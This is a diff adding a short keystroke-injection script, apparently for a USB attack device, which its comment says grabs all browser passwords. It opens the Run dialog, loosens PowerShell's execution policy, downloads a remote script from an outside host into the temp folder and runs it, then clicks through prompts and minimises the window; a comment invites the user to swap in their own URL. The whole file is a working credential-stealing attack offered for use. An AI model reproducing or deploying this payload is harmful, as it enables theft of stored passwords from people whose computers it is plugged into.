@@ -1,0 +1,16 @@
+REM This script grab all browsers passwords
+REM Change url to your own
+
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Set-ExecutionPolicy -Scope "CurrentUser" -ExecutionPolicy "Unrestricted"; powershell -c Start-BitsTransfer -Source "http://pronobot.xyz/FLIPPER/up0" -Destination $env:temp\up0.ps1; powershell $env:temp\up0.ps1;
+DELAY 2000
+ENTER
+DELAY 20000
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 5000
+WINDOWS DOWNARROW
+DELAY 10000
